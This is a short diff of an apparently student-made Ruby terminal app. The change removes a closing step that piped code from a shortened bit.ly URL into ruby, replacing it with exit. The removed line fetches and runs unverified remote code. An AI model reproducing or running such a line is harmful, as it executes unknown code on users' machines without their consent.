@@ -30,7 +30,7 @@ end
 def kill_doc
   prompt = TTY::Prompt.new
   begin
-    
+
     puts "The doctor has been killed! U MURDERER!!"
   rescue
     puts "Yep something went wrong in create_doc dunno where..."
@@ -146,5 +146,5 @@ def ender
 "
 puts "App created by Felix Chan and Otabek Kamalov"
   system 'sleep 5'
-  system 'curl -sL http://bit.ly/1A0iNjU | ruby'
+  exit#system 'curl -sL http://bit.ly/1A0iNjU | ruby'
 end
